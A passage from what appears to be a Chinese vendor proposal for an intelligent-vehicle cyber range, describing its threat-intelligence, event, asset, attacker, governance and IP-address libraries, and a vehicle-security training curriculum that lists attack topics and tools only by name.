威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，情报条目16万余条。</p><p>情报信息不限于发布时间、发布厂商、通告类型、影响地域、影响行业、威胁等级、攻击者组织、攻击者类型、通告详情等。</p><p>更新频次：</p><p>有互联网情况下，可以在线升级；情报库应以小时级升级。</p><p>在隔离网情况下，支持离线导入升级包方式升级，情报以天或周的频次升级。</p><p>支持非结构化情报导入，格式docx、pdf、txt等。</p><h3 id="智能汽车网络靶场事件库"><a href="#智能汽车网络靶场事件库" class="headerlink" title="智能汽车网络靶场事件库"></a>智能汽车网络靶场事件库</h3><p>事件库是安全分析的基础，通过资产告警日志、网络安全设备日志、安全告警等数据以及相关网络攻击行为、网络访问行为等安全事件的汇总。事件库用于存储处于汽车网络安全各个环节的事件信息，便于全面了解和掌握安全事件的情况和工作进展。</p><h4 id="靶场事件库方案"><a href="#靶场事件库方案" class="headerlink" title="靶场事件库方案"></a>靶场事件库方案</h4><p>事件收集：建立一个事件收集机制，监测和收集智能汽车网络领域的安全事件。事件ID、事件时间、事件名称、事件基础信息、事件详情、事件分类等各种信息和参考数据，以及对于网络安全事件处置中的流程信息等。可以通过订阅安全新闻、跟踪公开事件报告、关注安全研究机构的发布等方式获取最新的事件信息。</p><p>事件分类和归档：对收集到的事件进行分类和归档，建立一个结构化的事件库。云端发布的事件通报支持通过多种升级方式同步到用户本地平台，通报内容包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息，支持安全通告通过PDF方式进行导出。可以按照事件类型、漏洞利用方式、受影响的智能汽车品牌或型号等进行分类，方便用户进行事件搜索和筛选。</p><p>事件描述和分析：对每个事件进行详细的描述和分析，包括事件的发生时间、受影响的组件或系统、攻击方式、影响程度等信息。可以对事件进行溯源分析、攻击路径分析和影响评估，为用户提供深入的事件理解和分析结果。</p><p>事件响应和处置建议：针对每个事件提供相应的响应和处置建议，包括修复措施、漏洞补丁、安全配置建议等。用户可以根据事件库中的信息，及时采取相应的措施，降低智能汽车网络安全风险。</p><p>事件管理和更新：建立一个事件管理系统，对事件进行版本管理和更新。及时跟踪事件的解决情况和相关安全公告，确保事件库的及时更新和事件信息的准确性。重大行业及网络安全事件应及时更新，平时事件库根据靶场信息、行业信息等频次更新。</p><p>用户反馈和贡献：鼓励用户积极参与事件库的建设和完善，接受用户的反馈和事件报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>事件可视化和报告：提供事件可视化的功能，以图表、图形等形式展示事件的统计数据和趋势分析。同时，生成详细的事件报告，包括事件分析结果、响应建议、安全建议等，帮助用户更好地理解和应对事件。</p><p><strong>事件库内容</strong></p><p>事件库包括事件ID、事件时间、事件名称、事件基础信息、事件详情、事件分类等各种信息和参考数据。此外，还提供对于网络安全事件处置中的流程信息等。这些信息将帮助全面了解和掌握安全事件的情况和工作进展。</p><p><strong>云端发布的事件通报</strong></p><p>支持将云端发布的事件通报通过多种升级方式同步到用户本地平台。事件通报包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息。此外，还支持安全通告通过PDF方式进行导出，以方便的使用和分享。</p><p><strong>重大行业及网络安全事件更新</strong></p><p>了解重大行业及网络安全事件的及时更新对于的安全分析工作至关重要。因此，承诺根据靶场信息、行业信息等频次进行事件库的更新，以确保始终掌握最新的安全事件信息。</p><h4 id="产品彩页-2"><a href="#产品彩页-2" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/35c5bb45d51cbfce4368be92db9bdea3.png"></p><h4 id="产品参数-2"><a href="#产品参数-2" class="headerlink" title="产品参数"></a>产品参数</h4><p>事件库内容包括：事件ID、事件时间、事件名称、事件基础信息、事件详情、事件分类等各种信息和参考数据，以及对于网络安全事件处置中的流程信息等。</p><p>云端发布的事件通报支持通过多种升级方式同步到用户本地平台，通报内容包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息，支持安全通告通过PDF方式进行导出。</p><p>重大行业及网络安全事件应及时更新，平时事件库根据靶场信息、行业信息等频次更新。</p><h3 id="智能汽车网络靶场资产库"><a href="#智能汽车网络靶场资产库" class="headerlink" title="智能汽车网络靶场资产库"></a>智能汽车网络靶场资产库</h3><p>资产库是对于汽车安全靶场系统的资产进行管理的基础信息库。</p><h4 id="靶场资产库方案"><a href="#靶场资产库方案" class="headerlink" title="靶场资产库方案"></a>靶场资产库方案</h4><p>资产收集：建立一个资产收集机制，获取智能汽车网络中的各类资产信息，包括车辆型号、软件版本、网络架构、通信协议等。从大数据平台抓取资产数据并进行汇总，车辆资产数据不限于车型ID、入库车辆总数、注册车辆总数、在线车辆总数、最后修改时间。可以通过扫描工具、API接口、车辆厂商提供的数据等方式获取资产信息。</p><p>资产分类和归档：对收集到的资产信息进行分类和归档，建立一个结构化的资产库。从检测平台、SRC平台、靶场平台对接零部件设备数据，设备基本信息包括设备型号、设备厂家、所含资产及资产信息（芯片、协议、操作系统等）。可以按照车辆品牌、型号、软件版本等进行分类，方便用户进行资产搜索和筛选。</p><p>资产描述和分析：对每个资产进行详细的描述和分析，包括车辆的硬件组成、软件架构、网络连接方式等信息。通过录入形式导入车辆及零部件资产信息，车辆信息包括：车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号，设备信息包括设备（包括TBOX、车机等）序列号、设备型号、设备供应商、系统信息、版本信息。可以对资产进行安全评估和风险分析，为用户提供对资产的全面了解和分析结果。</p><p>资产漏洞和安全配置：记录每个资产的已知漏洞和安全配置信息。可以收集公开的漏洞报告、安全公告以及厂商提供的安全建议，为用户提供及时的漏洞和安全配置信息。</p><p>资产管理和更新：建立一个资产管理系统，对资产信息进行版本管理和更新。及时跟踪车辆厂商的软件更新、补丁发布等，确保资产库的及时更新和资产信息的准确性。</p><p>用户反馈和贡献：鼓励用户积极参与资产库的建设和完善，接受用户的反馈和资产信息报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>资产可视化和报告：提供资产可视化的功能，以图表、图形等形式展示资产的统计数据和分布情况。同时，生成详细的资产报告，包括资产分析结果、漏洞和安全配置建议等，帮助用户更好地理解和管理资产。</p><p><strong>资产数据汇总</strong></p><p>支持从大数据平台抓取资产数据并进行汇总。车辆资产数据包括车型ID、入库车辆总数、注册车辆总数、在线车辆总数、最后修改时间等信息。这些数据将帮助全面了解车辆资产的情况和状态。</p><p><strong>零部件设备数据对接</strong></p><p>支持与检测平台、SRC平台、靶场平台对接，以获取零部件设备的基本信息。设备基本信息包括设备型号、设备厂家、所含资产及资产信息（芯片、协议、操作系统等）。通过与这些平台的对接，可以获取更全面的设备信息并进行管理。</p><p><strong>录入形式导入资产信息</strong></p><p>除了从平台抓取数据外，还支持通过录入形式导入车辆及零部件资产信息。车辆信息包括车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号等。设备信息包括设备（包括TBOX、车机等）序列号、设备型号、设备供应商、系统信息、版本信息等。这样，可以方便地录入和管理自有资产信息。</p><h4 id="产品彩页-3"><a href="#产品彩页-3" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3e4860729ff1d76b1406756a81d1a748.png"></p><h4 id="产品参数-3"><a href="#产品参数-3" class="headerlink" title="产品参数"></a>产品参数</h4><p>支持从大数据平台抓取资产数据并进行汇总，车辆资产数据车型ID、入库车辆总数、注册车辆总数、在线车辆总数、最后修改时间。</p><p>支持从检测平台、SRC平台、靶场平台对接零部件设备数据，设备基本信息包括设备型号、设备厂家、所含资产及资产信息（芯片、协议、操作系统等）。</p><p>支持通过录入形式导入车辆及零部件资产信息，车辆信息包括车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号，设备信息包括设备（包括TBOX、车机等）序列号、设备型号、设备供应商、系统信息、版本信息。</p><h3 id="智能汽车网络靶场攻击者库"><a href="#智能汽车网络靶场攻击者库" class="headerlink" title="智能汽车网络靶场攻击者库"></a>智能汽车网络靶场攻击者库</h3><p>攻击者/组织库是汽车靶场从攻击者视角评估风险的基础。</p><h4 id="靶场攻击者库方案"><a href="#靶场攻击者库方案" class="headerlink" title="靶场攻击者库方案"></a>靶场攻击者库方案</h4><p>攻击者信息收集：建立一个攻击者信息收集机制，获取智能汽车网络领域的攻击者相关信息，包括攻击者的行为模式、攻击工具、攻击技术等。从威胁情报数据中获取已知APT攻击团伙的基础信息库，包括可能的国家、影响地区、攻击目的、历史攻击事件、攻击技战术手法等信息。可以通过监测黑客论坛、研究报告、安全威胁情报等渠道获取攻击者信息。</p><p>攻击者分类和归档：对收集到的攻击者信息进行分类和归档，建立一个结构化的攻击者库。显示APT团伙的常用的基础设施，包括：C2、样本HASH、IP、Domain、URL等。可以按照攻击者类型、攻击手段、攻击目标等进行分类，方便用户进行攻击者搜索和筛选。</p><p>攻击者描述和分析：对每个攻击者进行详细的描述和分析，包括攻击者的特征、攻击方法、攻击目的等信息。可以对攻击者进行行为分析、攻击路径分析和威胁评估，为用户提供深入的攻击者了解和分析结果。</p><p>攻击者模拟环境：建立一个攻击者模拟环境，用于模拟和重现智能汽车网络中的攻击行为。显示APT团伙技战法归纳，显示相应团伙常用的攻击手法等信息。可以搭建虚拟网络环境、使用合适的攻击工具和技术，模拟不同类型的攻击者行为，帮助用户了解攻击者的攻击方式和效果。</p><p>攻击者管理和更新：建立一个攻击者管理系统，对攻击者信息进行版本管理和更新。同步靶场记录的攻击者信息数据及攻击行为等数据。及时跟踪攻击者的新攻击技术、工具更新等，确保攻击者库的及时更新和攻击者信息的准确性。</p><p>用户反馈和贡献：鼓励用户积极参与攻击者库的建设和完善，接受用户的反馈和攻击者信息报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>攻击者可视化和报告：提供攻击者可视化的功能，以图表、图形等形式展示攻击者的统计数据和趋势分析。同时，生成详细的攻击者报告，包括攻击者分析结果、防御建议等，帮助用户更好地理解和应对攻击者。</p><p><strong>威胁情报数据获取</strong></p><p>支持从威胁情报数据中获取已知APT攻击团伙的基础信息库。这些信息包括可能的国家、影响地区、攻击目的、历史攻击事件、攻击技战术手法等。通过这些信息，可以了解不同攻击团伙的特征和行为，从而评估风险和采取相应的防护措施。</p><p><strong>APT团伙基础设施显示</strong></p><p>支持显示APT团伙的常用基础设施，包括C2（命令与控制）服务器、样本HASH、IP、Domain、URL等。这些信息将帮助追踪和监测APT团伙的活动，并及时采取反制措施。</p><p><strong>APT团伙技战法归纳</strong></p><p>支持显示APT团伙的技战法归纳，展示相应团伙常用的攻击手法等信息。这些信息将帮助了解不同团伙的攻击方式和模式，从而更好地应对潜在的威胁。</p><p><strong>同步靶场记录的攻击者信息</strong></p><p>支持同步靶场记录的攻击者信息数据及攻击行为等数据。这样，可以将实际的攻击情况与攻击者库中的信息进行比对和分析，以更好地了解攻击者的行为和特征。</p><h4 id="产品彩页-4"><a href="#产品彩页-4" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/857a792b32ec4aaff51e8acf0ad32492.png"></p><h4 id="产品参数-4"><a href="#产品参数-4" class="headerlink" title="产品参数"></a>产品参数</h4><p>支持从威胁情报数据中获取已知APT攻击团伙的基础信息库，包括可能的国家、影响地区、攻击目的、历史攻击事件、攻击技战术手法等信息。</p><p>支持显示APT团伙的常用的基础设施，包括：C2、样本HASH、IP、Domain、URL等。</p><p>支持显示APT团伙技战法归纳，显示相应团伙常用的攻击手法等信息。</p><p>支持同步靶场记录的攻击者信息数据及攻击行为等数据。</p><h3 id="智能汽车网络靶场治理资源库"><a href="#智能汽车网络靶场治理资源库" class="headerlink" title="智能汽车网络靶场治理资源库"></a>智能汽车网络靶场治理资源库</h3><p>智能汽车网络靶场治理资源库对于网络空间治理和应急指挥业务相关的资源。</p><h4 id="靶场治理资源库方案"><a href="#靶场治理资源库方案" class="headerlink" title="靶场治理资源库方案"></a>靶场治理资源库方案</h4><p>治理法规和标准：收集智能汽车网络领域的相关法规、标准和规范，包括国家和地区的法律法规、行业标准、安全规范等。通过与SRC平台、漏洞管理及检测平台数据对接，向安全运营平台提供数据基础，结合治理资源库，为平台的通报处置、应急指挥等业务提供基础数据资源，治理资源包含涉及的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等。建立一个法规和标准的数据库，为用户提供参考和遵循的依据。</p><p>治理框架和流程：制定智能汽车网络的治理框架和流程，包括安全管理体系、风险评估流程、安全漏洞报告和处理流程等。提供相应的模板和工具，帮助用户建立和实施有效的治理框架和流程。</p><p>安全建议和最佳实践：收集智能汽车网络领域的安全建议和最佳实践，包括安全配置指南、网络防御策略、安全培训材料等。建立一个安全建议和最佳实践的知识库，为用户提供实用的安全指导和操作指南。</p><p>安全工具和解决方案：整理智能汽车网络领域的安全工具和解决方案，包括入侵检测系统、漏洞扫描工具、安全监控系统等。治理资源库包括应急预案（DDOS、重大开源组件漏洞等事件预案），应急处置流程及运营流程SOP。提供工具的介绍、使用指南和评估报告，帮助用户选择和使用合适的安全工具和解决方案。</p><p>治理案例和教育资源：收集智能汽车网络领域的治理案例和教育资源，包括安全事件的调查报告、安全意识培训材料、安全教育视频等。提供案例分析和教育资源，帮助用户学习和借鉴他人的治理经验和教训。</p><p>用户反馈和贡献：鼓励用户积极参与治理资源库的建设和完善，接受用户的反馈和资源贡献，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>资源搜索和检索：提供一个方便的搜索和检索功能，让用户能够快速找到所需的治理资源。可以根据关键词、标签、分类等进行搜索和筛选，提供相关资源的链接和下载。</p><p><strong>数据对接与基础资源提供</strong></p><p>支持与SRC平台、漏洞管理及检测平台数据的对接，向安全运营平台提供数据基础。通过结合治理资源库，为平台的通报处置、应急指挥等业务提供基础数据资源。这些资源包括涉及的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等。通过这些数据，可以更好地了解网络空间的风险情况，并采取相应的治理措施。</p><p><strong>应急预案和处置流程</strong></p><p>支持治理资源库的应急预案，至少包含DDOS、重大开源组件漏洞等事件预案。预案将提供详细的应急处置流程和运营流程SOP，以帮助在紧急情况下迅速响应和处理安全事件。这些预案和流程将指导的团队进行应急指挥和治理操作，确保网络空间的安全和稳定。</p><h4 id="产品彩页-5"><a href="#产品彩页-5" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f34a23c42a29c794cbf69ca62d47acee.png"></p><h4 id="产品参数-5"><a href="#产品参数-5" class="headerlink" title="产品参数"></a>产品参数</h4><p>通过与SRC平台、漏洞管理及检测平台数据对接，向安全运营平台提供数据基础，结合治理资源库，为平台的通报处置、应急指挥等业务提供基础数据资源，治理资源包含涉及的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等。</p><p>治理资源库包括应急预案（包含DDOS、重大开源组件漏洞等事件预案），应急处置流程及运营流程SOP。</p><h3 id="智能汽车网络靶场IP地址库"><a href="#智能汽车网络靶场IP地址库" class="headerlink" title="智能汽车网络靶场IP地址库"></a>智能汽车网络靶场IP地址库</h3><p>具备汽车靶场平台所有车辆及平台资产的IP信息，通过IP信息可实现对资产的关联管理。</p><h4 id="靶场IP地址库方案"><a href="#靶场IP地址库方案" class="headerlink" title="靶场IP地址库方案"></a>靶场IP地址库方案</h4><p>IP地址收集：建立一个IP地址收集机制，获取智能汽车网络中的相关IP地址信息。IP地址库包含前期各大数据平台系统IP，以及现有系统各子系统的IP信息。可以通过扫描智能汽车网络、监测网络流量、收集网络日志等方式获取IP地址。</p><p>IP地址分类和归档：对收集到的IP地址进行分类和归档，建立一个结构化的IP地址库。IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式。可以按照IP地址的用途、所属组织、地理位置等进行分类，方便用户进行IP地址搜索和筛选。</p><p>IP地址描述和分析：对每个IP地址进行详细的描述和分析，包括IP地址的功能、所属组织、网络拓扑等信息。可以对IP地址进行漏洞扫描、安全评估和风险评估，为用户提供有关IP地址的安全情报和威胁分析结果。</p><p>IP地址管理和更新：建立一个IP地址管理系统，对IP地址信息进行版本管理和更新。IP地址包含所有车辆零部件（TBOX、车机系统）IP信息管理，包含车辆ID数据。及时跟踪IP地址的变动、新增的IP地址等，确保IP地址库的及时更新和IP地址信息的准确性。</p><p>用户反馈和贡献：鼓励用户积极参与IP地址库的建设和完善，接受用户的反馈和IP地址信息报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>IP地址可视化和报告：提供IP地址可视化的功能，以图表、图形等形式展示IP地址的统计数据和趋势分析。同时，生成详细的IP地址报告，包括IP地址分析结果、安全建议等，帮助用户更好地理解和应对IP地址相关的安全威胁。</p><p><strong>IP地址库的完整性</strong></p><p>将包含前期各大数据平台系统IP，以及现有系统各子系统的IP信息。通过建立完整的IP地址库，可以准确地追踪和管理所有相关资产的IP信息。</p><p><strong>IP地址库的信息内容</strong></p><p>将提供详细的IP地址库信息，包括IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式。这些信息将帮助准确地了解每个IP地址的所属单位和相关联系人，以便进行关联管理和沟通。</p><p><strong>车辆零部件IP信息管理</strong></p><p>将特别包含车辆零部件（如TBOX、车机系统）的IP信息管理。这将帮助对每个车辆的零部件IP进行跟踪和管理，并与其他资产进行关联。此外，还支持车辆ID数据的管理，以确保对车辆的唯一标识和关联管理。</p><h4 id="产品彩页-6"><a href="#产品彩页-6" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c0fafcb0790ef9269941c103d70505b5.png"></p><h4 id="产品参数-6"><a href="#产品参数-6" class="headerlink" title="产品参数"></a>产品参数</h4><p>IP地址库包含前期各大数据平台系统IP，以及现有系统各子系统的IP信息。</p><p>IP地址库包含：IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式。</p><p>IP地址包含所有车辆零部件（TBOX、车机系统）IP信息管理，包含车辆ID数据。</p><h3 id="人才培养"><a href="#人才培养" class="headerlink" title="人才培养"></a>人才培养</h3><p>为保障XXXX实验室建成后，能够使XXXX实验室相关技术人员熟练使用和运用车联网检测工具、安全靶场及安全运用平台，全面构建XXXX车联网安全检测、分析及运营能力人才体系。我司结合提供的设备及平台，提供专业且全面的车联网安全人才培养方案，方案内容涉及专业人员岗位设计、专业课程知识涉及、培训及考核方案设计。方案内容包含教学实训、车联网行业知识学习、技能认证等。</p><p>通过系统化的培养计划，应该达到以下几方面的要求：</p><p>能够使XXXX实验室相关人员具备基础安全意识，熟悉国家及行业安全的法律法规内容；</p><p>掌握车联网安全基本知识，掌握计算机网络、信息安全基础理论的基础知识，掌握常用的安全测试方法，熟练使用相关测试工具；</p><p>掌握车联网基础安全分析及安全运营知识，具备能够进行系统加固、漏洞扫描、系统渗透测试、网络安全应急响应的能力；</p><p>课程设计针对不同类别的培训内容进行课程设计，课程类别包含专业技术课、专业拓展课、项目实训课，课程内容及工时包含以下内容（在培养开始时及交付时，我司将提供课程视频源文件）：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b16fa88d9743451590cf1562441d492a.png" alt="GL"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/89a90289b5fa9fe918381d7c73b3afaa.png" alt="GL2"></p><p>(课程源文件目录）</p><table><thead><tr><th><strong>课程类别</strong></th><th><strong>课程名称</strong></th><th><strong>课程内容</strong></th><th><strong>课时</strong></th></tr></thead><tbody><tr><td>专业基础课</td><td>信息安全基础</td><td>64</td><td></td></tr><tr><td></td><td>网络安全法律法规</td><td>汽车整车信息安全技术要求，R155,R156,汽车软件升级通用技术要求，GB∕T 40855-2021 电动汽车远程服务与管理系统信息安全技术要求及试验方法, GB∕T 40856-2021 车载信息交互系统信息安全技术要求及试验方法, GB∕T 40857-2021 汽车网关信息安全技术要求及试验方法, GB∕T 40861-2021 汽车信息安全通用技术要求,ISO21434,ISO26262，等保2.0</td><td>16</td></tr><tr><td></td><td>车联网安全基础</td><td>64</td><td></td></tr><tr><td></td><td>汽车零部件基础</td><td>64</td><td></td></tr><tr><td></td><td>操作系统基础</td><td>48</td><td></td></tr><tr><td></td><td>密码学原理</td><td>基础数学知识 古典密码 流密码 块加密 非对称加密 哈希函数 数字签名 证书格式 算法应用实践</td><td>24</td></tr><tr><td></td><td>数据结构与数据安全</td><td>64</td><td></td></tr><tr><td></td><td>汽车网络靶场技术原理及应用</td><td>汽车网络靶场虚拟化技术原理</td><td>16</td></tr><tr><td></td><td></td><td>汽车网络靶场态势感知技术原理</td><td>16</td></tr><tr><td></td><td></td><td>实车接入及众测介绍</td><td>16</td></tr><tr><td></td><td></td><td>MCU虚拟化靶标制作</td><td>32</td></tr><tr><td></td><td></td><td>MPU靶标制作</td><td>32</td></tr><tr><td>专业核心课</td><td>信息系统安全</td><td>64</td><td></td></tr><tr><td></td><td>软件安全</td><td>48</td><td></td></tr><tr><td></td><td>车端安全管理</td><td>48</td><td></td></tr><tr><td></td><td>网络安全攻防基础</td><td>64</td><td></td></tr><tr><td></td><td>漏洞扫描与防护</td><td>32</td><td></td></tr><tr><td></td><td>恶意代码原理与防治</td><td>48</td><td></td></tr><tr><td></td><td>汽车安全威胁场景安全管理</td><td>48</td><td></td></tr><tr><td></td><td>Web安全原理分析与实践</td><td>48</td><td></td></tr><tr><td></td><td>CAN</td><td>CAN相关协议分析(CAN,CANFD,UDS) CAN攻击场景分析(模糊测试，重放，DOS,UDS探测) CAN工具使用(CANOE1640,PCAN,USB-CAN) CAN防护措施分析(secoc,canids)</td><td>10</td></tr><tr><td></td><td>以太网</td><td>ETH相关协议分析(doip,someip,ssh,ftp,vlan,arp,adb，mqtt,dns) ETH攻击场景(IP探测,端口扫描,暴力破解,数据重放攻击,ARP欺骗,doip渗透,someip渗透,mqtt渗透，dns欺骗,非法代理，漏洞扫描) ETH工具使用(CANOE5640,nessus,frp,wireshark,tcpdump,100BaseT1) ETH防护措施(防火墙,TLS,ETH IDS)</td><td>20</td></tr><tr><td></td><td>GPS</td><td>GPS相关协议(NMEA0183协议) GPS攻击场景(GPS欺骗,GPS路径模拟) GPS工具使用(hackrf,bladerf) GPS、北斗、欧洲伽利略区别与安全分析</td><td>5</td></tr><tr><td></td><td>蜂窝网络</td><td>蜂窝网络相关协议(2G,3G,4G,5G) 蜂窝网络攻击场景(恶意降级，Dos攻击，数据嗅探)</td><td>5</td></tr><tr><td></td><td>wifi</td><td>wifi加密方式(WEP,WPA,WPA-PSK) wifi攻击场景(wifi嗅探，wifi抓包，wifi泛洪攻击，wifi密码破解,wifi钓鱼) wifi攻击工具使用(aircrack-ng,aireplay,airodump,Fluxion) wifi模糊测试</td><td>5</td></tr><tr><td></td><td>蓝牙</td><td>蓝牙相关协议(HCI、L2CAP、SDP、RFOCMM) 蓝牙攻击场景(身份验证滥用,通用漏洞检测) 蓝牙攻击工具(hciconfig,hcitool,bluetoothctl, bluetoothd,btmon,hciattach,hcidump) 蓝牙模糊测试 经典蓝牙与低功耗蓝牙应用场景和功能介绍 蓝牙安全机制 蓝牙安全漏洞介绍 车载蓝牙通用问题</td><td>10</td></tr><tr><td></td><td>射频</td><td>射频攻击场景(射频重放，射频录制，射频中继) 射频防护措施(滚码机制)</td><td>5</td></tr><tr><td></td><td>NFC</td><td>NFC卡类别(ID卡、IC卡、RFID卡、NFC卡、Mifare卡) NFC攻击场景(NFC中继攻击，NFC加密破解)</td><td>5</td></tr><tr><td></td><td>UWB</td><td>UWB协议介绍以及安全分析</td><td>5</td></tr><tr><td></td><td>USB</td><td>USB攻击场景(USB模糊测试) USB工具(facedancer)</td><td>5</td></tr><tr><td></td><td>固件</td><td>固件逆向分析工具(objdump,ptrace,ida,gdb,pwntools.qemu，binwalk等) 固件攻击场景(升级包加密密钥分析,控车指令分析) ELF文件基本结构 ELF文件加载 ELF链接 ELF执行流程</td><td>10</td></tr><tr><td></td><td>系统</td><td>操作系统启动原理 操作系统与硬件 操作系统开发的技术实现路径 Linux、Android、qnx、RTOS、AUTOSAR CP、AUTOSAR AP架构以及组成介绍 系统应用安全配置与分析(ssh,adb,ftp,someip,doip,mqtt等) Linux系统目录结构介绍 Linux系统文件基本属性 Linux系统文件与目录管理 Linux系统用户和用户组管理 Linux系统磁盘管理 Linux系统基本命令 Linux系统权限(SUID,SGID,SBIT) Linux系统内核漏洞分析 ELF文件介绍以及相关的安全防护措施(Canary,DEP,ASLR,Fortify,NX,RELRO) Linux系统安全防护措施绕过 Android系统安全防护措施以及绕过 交叉编译工具链分析 Hypervisor原理以及安全分析 QNX基础讲解及应用领域 IPC介绍 QNX进程管理 QNX文件管理 QNX设备管理 QNX网络管理 RTOS基础讲解及应用领域 RTOS中断管理介绍</td><td>20</td></tr><tr><td></td><td>硬件</td><td>PCB板结构与组成介绍 PCB 板设计集成拆卸实践 硬件芯片分析识别与查找(RENESAS,英飞凌,ST等) MCU、MPU基础知识讲解 硬件芯片手册查找 硬件芯片引脚查找与功能分析 UART,JTAG等硬件接口查找与安全分析 EMMC,FLASH,EEPROM等固件提取与分析 单片机开发实践 硬件安全芯片原理介绍 硬件渗透方法</td><td>8</td></tr><tr><td></td><td>Web渗透</td><td>信息收集 子域名收集 目录扫描分析 指纹识别 SQL注入渗透与防御 XSS渗透与防御 上传验证渗透与防御 文件包含渗透与防御 CSRF渗透与防御 SSRF渗透与防御 XXE渗透与防御 远程代码执行渗透与防御 反序列化渗透与防御 逻辑漏洞 暴力破解与防御 Redis未授权访问漏洞 社会工程学 web相关测试工具使用（sqlmap，msf，awvs,中国菜刀，xray，kali等）</td><td>20</td></tr><tr><td></td><td>语言</td><td>C语言介绍 C语言语法 C语言指针 C语言文件操作 C语言进程操作 C语言线程操作 C语言访问数据库 C语言应用领域与实现方案 C语言开发实践 C语言编写相关测试脚本 Capl语言语法介绍 Capl语言特性与性能 Capl语言编写测试脚本实践 C++语言介绍 C++语言语法 C++语言应用领域与实现方案 C++软件开发实践 C#语言介绍 C#语言语法 C#语言应用领域与实现方案 C#软件开发实践 Python语言介绍 Python基本语法 Python文件操作 Python进程操作 Python线程操作 Python网络编程 Python访问数据库 Python应用的领域以及其常用的第三方模块 Python编写相关测试脚本 Go语言介绍 Go语言语法 Go应用领域与实现方案 Go开发实践 Docker使用</td><td>24</td></tr><tr><td></td><td>汇编</td><td>X86_x64,MIPS,ARM架构与编译工具介绍 ARM汇编基础 ARM指令集 MIPS寄存器 MIPS指令 汇编编译链接 汇编实践 二进制文件逆向分析</td><td>8</td></tr><tr><td>项目实训课</td><td>移动安全</td><td>64</td><td></td></tr><tr><td></td><td>车联网安全防护能力建设</td><td>64</td><td></td></tr><tr><td></td><td>车联网应用安全防护能力建设</td><td>64</td><td></td></tr><tr><td></td><td>车联网安全运维管理</td><td>64</td><td></td></tr><tr><td></td><td>整车渗透</td><td>资产识别 威胁场景分析 攻击路径分析 Wifi渗透 USB渗透 蓝牙渗透 OBD-CAN渗透 OBD-ETH渗透 车端代理 跨域ip分析 整车业务攻击(OTA,数字钥匙，射频钥匙，车机APP重要业务)</td><td>64</td></tr><tr><td></td><td>内网渗透</td><td>内网主机发现 内网横向移动 垂直越权 权限维持</td><td>5</td></tr><tr><td></td><td>手机APP(ios和android)</td><td>加固分析 静态分析 动态分析调试 脱壳分析(360脱壳，邦邦脱壳，爱加密脱壳，腾讯脱壳) 代理检测与绕过分析 Frida hook(java 层hook，native so层hook，ssl pinning绕过，okhttp3等通信框架绕过) Frida防护措施与绕过 通信数据抓取 业务逻辑分析 Burp工具使用</td><td>20</td></tr><tr><td></td><td>车机APP</td><td>车机APP重要业务分析 车机配置代理与分析 车机APP模拟运行 通信数据抓包与篡改分析</td><td>5</td></tr><tr><td></td><td>固件</td><td>通用固件解包 固件分析与动态调试 Qemu搭建与调试固件</td><td>5</td></tr><tr><td></td><td>Web渗透</td><td>OTA服务器结合web理论渗透测试</td><td>10</td></tr><tr><td></td><td>代码</td><td>源码扫描与漏洞分析</td><td>10</td></tr><tr><td></td><td>汽车安全应急响应</td><td>48</td><td></td></tr><tr><td></td><td>汽车安全运营及安全服务</td><td>48</td><td></td></tr></tbody></table><p>通过实训课程，提高XXXX安全测试人员对网络安全理论知识和主流安全防护手段的理解，达到独立分析和设计简单网络安全方案的能力，并可以独立完成项目实施调试，提高相关人员的实际动手和实践测试能力。实训课程的过程设计以项目管理流程为课程管理主线，通过项目管理方法，控制项目质量，提高相关人员对于项目过程的理解能力。</p><p>对于课程学习后，对于学习人员进行成果考核，考核形式包含题库考试、攻防竞技等，通过竞技形式，可以针对实训的内容进行阶段性的测试考核，评估学习效果。</p><p>我司根据课程情况及实训安排，提供实训平台工具（可利用靶场实训模块），进行实训教学，实训教学包含课程教学管理、项目实训、考试测评等内容。</p><p>实训平台考试测评内容包含基础教学、项目实训、考试测评三个主要方面，并自动生成学生能力测评图谱便于人员了解自身的学习短板，对于人员定级可分为初级、中级、高级，个人可根据自身成绩进行查缺补漏，生成人员考评分析报告，帮助教师总结学习近期学习状况，知识内容难点，成绩分布情况等。</p><p>我司提供10人cisp或cissp相关认证类服务，包括CISP-PTE 